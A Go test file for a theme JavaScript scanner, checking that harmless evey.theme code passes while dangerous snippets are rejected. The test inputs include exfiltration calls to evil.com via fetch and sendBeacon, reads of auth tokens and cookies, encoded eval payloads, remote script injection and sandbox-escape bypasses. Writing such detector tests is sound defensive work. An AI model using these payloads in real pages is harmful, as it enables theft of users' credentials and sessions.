package themejs

import (
	"testing"
)

func TestScan_BenignJS_Passes(t *testing.T) {
	src := []byte(`
evey.theme.registerComponent("my-card", function(el, props) {
  evey.theme.observe(el, props);
  evey.theme.css(el, "background: var(--card-bg);");
  evey.theme.transition(el, "opacity", 0.3);
});
`)
	err, warns := Scan(src)
	if err != nil {
		t.Errorf("benign JS blocked: %v", err)
	}
	_ = warns
}

func TestScan_EmptySource_Passes(t *testing.T) {
	err, warns := Scan([]byte{})
	if err != nil {
		t.Errorf("empty source blocked: %v", err)
	}
	_ = warns
}

func TestScan_Fetch_Blocked(t *testing.T) {
	src := []byte(`fetch("https://evil.com/exfil?data=" + document.title);`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for fetch( pattern")
	}
}

func TestScan_LocalStorage_Blocked(t *testing.T) {
	src := []byte(`var token = localStorage.getItem("auth_token");`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for localStorage pattern")
	}
}

// A blocked literal that ends the file exactly is still found: the scan must
// check the last position, where a minified theme can put it (mutation
// 2026-09-28: the end-of-source boundary was never exercised).
func TestScan_LiteralAtTheVeryEnd_Blocked(t *testing.T) {
	src := []byte(`var s=localStorage`)
	if err, _ := Scan(src); err == nil {
		t.Error("a blocked literal ending the source must be rejected")
	}
}

func TestScan_DocumentCookie_Blocked(t *testing.T) {
	src := []byte(`var c = document.cookie;`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for document.cookie pattern")
	}
}

func TestScan_Eval_Blocked(t *testing.T) {
	src := []byte(`eval("alert(1)");`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for eval( pattern")
	}
}

func TestScan_WindowParent_Blocked(t *testing.T) {
	src := []byte(`window.parent.postMessage("steal", "*");`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for window.parent pattern")
	}
}

func TestScan_SessionStorage_Blocked(t *testing.T) {
	src := []byte(`sessionStorage.setItem("key", "val");`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for sessionStorage pattern")
	}
}

func TestScan_XMLHttpRequest_Blocked(t *testing.T) {
	src := []byte(`var xhr = new XMLHttpRequest();`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for XMLHttpRequest pattern")
	}
}

func TestScan_NavigatorSendBeacon_Blocked(t *testing.T) {
	src := []byte(`navigator.sendBeacon("https://evil.com/", data);`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for navigator.sendBeacon pattern")
	}
}

func TestScan_FunctionConstructor_Blocked(t *testing.T) {
	src := []byte(`var fn = new Function("return fetch('/')")();`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for Function( pattern")
	}
}

func TestScan_DynamicImport_Blocked(t *testing.T) {
	src := []byte(`import("https://evil.com/malware.js").then(m => m.run());`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for import( pattern")
	}
}

func TestScan_Atob_Blocked(t *testing.T) {
	src := []byte(`eval(atob("ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20nKQ=="));`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for atob( pattern")
	}
}

func TestScan_TopAccess_Blocked(t *testing.T) {
	src := []byte(`top.location.href = "https://evil.com";`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for top. pattern")
	}
}

func TestScan_ParentAccess_Blocked(t *testing.T) {
	src := []byte(`parent.postMessage("exfil", "*");`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for parent. pattern")
	}
}

func TestScan_DocumentWrite_Blocked(t *testing.T) {
	src := []byte(`document.write("<script src='//evil.com/x.js'></scr"+"ipt>");`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for document.write pattern")
	}
}

func TestScan_ElementPrototype_Blocked(t *testing.T) {
	src := []byte(`Element.prototype.addEventListener = function() {};`)
	err, _ := Scan(src)
	if err == nil {
		t.Error("expected error for Element.prototype pattern")
	}
}

// Bypass attempts that the original literal-only scanner missed.

func TestScan_BracketNotation_FetchBlocked(t *testing.T) {
	src := []byte(`window["fetch"]("https://evil.com/exfil");`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for window[\"fetch\"] bracket access")
	}
}

func TestScan_GlobalThis_FetchBlocked(t *testing.T) {
	src := []byte(`globalThis.fetch("https://evil.com");`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for globalThis.fetch bypass")
	}
}

func TestScan_Reflect_GetBlocked(t *testing.T) {
	src := []byte(`var f = Reflect.get(window, "fetch"); f("/");`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for Reflect.get global escape")
	}
}

func TestScan_ConstructorConstructor_Blocked(t *testing.T) {
	src := []byte(`([]).constructor.constructor("return fetch")();`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for constructor.constructor escape")
	}
}

func TestScan_BracketLocalStorage_Blocked(t *testing.T) {
	src := []byte(`var t = window['localStorage'].getItem('x');`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for window['localStorage'] bracket access")
	}
}

func TestScan_DocumentBracket_Blocked(t *testing.T) {
	src := []byte(`document["coo"+"kie"];`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for document[..] bracket bypass")
	}
}

func TestScan_NewFunctionAliased_Blocked(t *testing.T) {
	src := []byte(`var F = self.Function; new F("alert(1)")();`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for new Function via alias")
	}
}

func TestScan_ObjectPrototypePollution_Blocked(t *testing.T) {
	src := []byte(`Object.prototype.hacked = true;`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for Object.prototype write")
	}
}

func TestScan_WindowAssignment_Blocked(t *testing.T) {
	src := []byte(`top.location = "https://evil.com";`)
	if err, _ := Scan(src); err == nil {
		t.Error("expected error for top.location assignment")
	}
}

func TestScan_OnlyEveyAPIAllowed(t *testing.T) {
	// Full realistic theme that only uses the evey.theme.* API.
	src := []byte(`
(function() {
  "use strict";

  evey.theme.registerComponent("hero-banner", function(root, props) {
    evey.theme.css(root, [
      ".hero { background: var(--hero-bg); padding: 2rem; }",
      ".hero h1 { font-size: 2em; color: var(--text-primary); }",
    ].join("\n"));

    evey.theme.observe(root, props, function(p) {
      root.querySelector(".hero h1").textContent = p.title || "Welcome";
    });
  });

  evey.theme.registerComponent("card-grid", function(root, props) {
    evey.theme.transition(root, "opacity", 0.2);
    evey.theme.css(root, ".grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); }");
  });
})();
`)
	err, warns := Scan(src)
	if err != nil {
		t.Errorf("evey-only theme blocked: %v", err)
	}
	_ = warns
}
